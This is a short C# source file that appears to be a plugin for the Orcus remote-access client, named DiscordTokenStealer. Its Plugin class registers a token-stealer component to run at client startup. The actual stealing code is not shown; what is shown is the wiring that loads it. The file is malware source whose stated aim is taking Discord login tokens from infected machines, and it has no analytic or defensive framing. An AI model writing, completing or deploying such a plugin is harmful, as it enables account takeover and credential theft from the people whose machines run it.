using Orcus.Plugins;

namespace DiscordTokenStealer
{
    public class Plugin : ClientController
    {
        private DiscordTokenStealer _tokenStealer;

        public override bool InfluenceStartup(IClientStartup clientStartup)
        {
            _tokenStealer = new DiscordTokenStealer();
            return _tokenStealer.InfluenceStartup(clientStartup);
        }
    }
}